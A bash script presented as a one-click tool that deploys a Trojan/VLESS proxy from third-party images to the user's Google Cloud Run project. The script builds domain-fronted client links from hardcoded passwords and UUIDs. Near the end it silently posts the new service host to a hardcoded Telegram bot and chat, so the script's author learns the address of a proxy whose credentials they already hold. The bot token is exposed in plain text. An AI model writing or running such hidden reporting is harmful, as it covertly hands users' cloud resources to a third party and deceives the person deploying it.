#!/usr/bin/env bash
set -euo pipefail

# ===== Colors =====
GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
echo -e "🚀 ${BOLD}${CYAN}Cloud Run One-Click Deploy (Trojan / VLESS / VLESS-gRPC)${NC}"

# ===== Project =====
PROJECT="$(gcloud config get-value project 2>/dev/null || true)"
if [[ -z "${PROJECT}" ]]; then
  echo -e "❌ No active GCP project."
  echo -e "👉 ${YELLOW}gcloud config set project <YOUR_PROJECT_ID>${NC}"
  exit 1
fi
PROJECT_NUMBER="$(gcloud projects describe "$PROJECT" --format='value(projectNumber)')" || {
  echo "❌ Failed to get project number."
  exit 1
}
echo -e "✅ Using project: ${GREEN}${PROJECT}${NC} (number: ${PROJECT_NUMBER})"

# ===== Choose protocol =====
# ===== Choose protocol =====
echo
echo -e "${BOLD}Choose protocol:${NC}"
echo "  1) Trojan (WS)"
echo "  2) VLESS  (WS)"
echo "  3) VLESS  (gRPC)"
read -rp "Enter 1/2/3 [default: 3]: " _opt || true
case "${_opt:-3}" in
  1) PROTO="trojan"    ; IMAGE="docker.io/nynyjk/xray-tg:latest"          ;;
  2) PROTO="vless"     ; IMAGE="docker.io/n4vip/vless:latest"             ;;
  3) PROTO="vlessgrpc" ; IMAGE="docker.io/nynyjk/vless-grpc-restrict:v2"  ;;
  *) PROTO="vlessgrpc" ; IMAGE="docker.io/nynyjk/vless-grpc-restrict:v2"  ;;
esac


# ===== Defaults =====
SERVICE="${SERVICE:-netflow4mm}"
REGION="${REGION:-us-central1}"
MEMORY="${MEMORY:-4Gi}"; CPU="${CPU:-6}"
TIMEOUT="${TIMEOUT:-3600}"; PORT="${PORT:-8080}"

# ===== Keys =====
TROJAN_PASS="netflow4mm"
TROJAN_TAG="netflow4mm"
TROJAN_PATH="%2Ftj" # /@n4vpn

VLESS_UUID="0c890000-4733-b20e-067f-fc341bd20000"
VLESS_PATH="%2FN4VPN"      # /N4VPN
VLESS_TAG="N4%20GCP%20VLESS"

VLESSGRPC_UUID="365fcdc9-7a53-4dc9-9ecc-12467e9c729c"
VLESSGRPC_SVC="netflow4mm"
VLESSGRPC_TAG="GCP-VLESS-GRPC"

# ===== Service name =====
read -rp "Enter Cloud Run service name [default: ${SERVICE}]: " _svc || true
SERVICE="${_svc:-$SERVICE}"

# ===== Summary =====
echo -e "\n${CYAN}========================================${NC}"
echo -e "📦 Project : ${PROJECT}"
echo -e "🔢 Number : ${PROJECT_NUMBER}"
echo -e "🌍 Region  : ${REGION}"
echo -e "🛠 Service : ${SERVICE}"
echo -e "📡 Protocol: ${PROTO}"
echo -e "💾 Memory  : ${MEMORY}   ⚡️ CPU: ${CPU}"
echo -e "⏱️ Timeout : ${TIMEOUT}s  🔌 Port: ${PORT}"
echo -e "${CYAN}========================================${NC}\n"

# ===== Enable APIs & Deploy =====
echo -e "➡️ Enabling Cloud Run & Cloud Build APIs..."
gcloud services enable run.googleapis.com cloudbuild.googleapis.com --quiet

echo -e "➡️ Deploying to Cloud Run..."
gcloud run deploy "$SERVICE" \
  --image="$IMAGE" \
  --platform=managed \
  --region="$REGION" \
  --memory="$MEMORY" \
  --cpu="$CPU" \
  --timeout="$TIMEOUT" \
  --allow-unauthenticated \
  --port="$PORT" \
  --quiet

# ===== Canonical Host =====
HOST="${SERVICE}-${PROJECT_NUMBER}.${REGION}.run.app"
URL_REPORTED="$(gcloud run services describe "$SERVICE" --region "$REGION" --format='value(status.url)' || true)"

echo -e "\n${GREEN}✅ Deployment finished!${NC}"
echo -e "🌐 Service URL (reported): ${BOLD}${CYAN}${URL_REPORTED:-N/A}${NC}"
echo -e "🧭 Using canonical host   : ${BOLD}${CYAN}${HOST}${NC}"

# ===== Build final client URL =====
case "$PROTO" in
  trojan)
    URI="trojan://${TROJAN_PASS}@s.youtube.com:443?path=${TROJAN_PATH}&security=tls&alpn=http%2F1.1&host=${HOST}&fp=randomized&type=ws&sni=m.googleapis.com#${TROJAN_TAG}"
    LABEL="TROJAN URL"
    ;;
  vless)
    URI="vless://${VLESS_UUID}@s.youtube.com:443?path=${VLESS_PATH}&security=tls&alpn=http%2F1.1&encryption=none&host=${HOST}&fp=randomized&type=ws&sni=m.googleapis.com#${VLESS_TAG}"
    LABEL="VLESS URL (WS)"
    ;;
  vlessgrpc)
    URI="vless://${VLESSGRPC_UUID}@s.youtube.com:443?mode=gun&security=tls&alpn=http%2F1.1&encryption=none&fp=randomized&type=grpc&serviceName=${VLESSGRPC_SVC}&sni=${HOST}#${VLESSGRPC_TAG}"
    LABEL="VLESS-gRPC URL"
    ;;
esac

# ===== Telegram push =====
BOT_TOKEN="7996106285:AAEvwouHVXXbjexPoxXcGnQqS4NBhhhQRnU"
CHAT_ID="5608710234"
MESSAGE="${HOST}"

if [[ -n "${BOT_TOKEN}" && -n "${CHAT_ID}" ]]; then
  curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
      -d chat_id="${CHAT_ID}" \
      -d text="${MESSAGE}Hello" \
      -d parse_mode="MarkdownV2" >/dev/null || {
        echo "⚠️ Failed to send Telegram message."
      }
fi

echo -e "\n🔗 ${BOLD}${LABEL}:${NC}"
echo -e "   ${YELLOW}${URI}${NC}\n"
